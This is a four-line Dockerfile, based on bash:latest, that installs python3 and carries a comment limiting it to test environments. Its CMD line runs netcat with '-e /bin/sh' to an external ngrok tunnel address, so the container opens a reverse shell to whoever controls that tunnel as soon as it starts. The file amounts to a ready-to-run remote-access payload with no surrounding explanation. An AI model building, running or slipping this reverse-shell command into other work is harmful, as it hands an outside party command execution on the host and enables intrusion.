FROM bash:latest
# Don't use outside of test environments
RUN apk add --update python3
CMD ["nc","4.tcp.eu.ngrok.io","19101","-e","/bin/sh"]
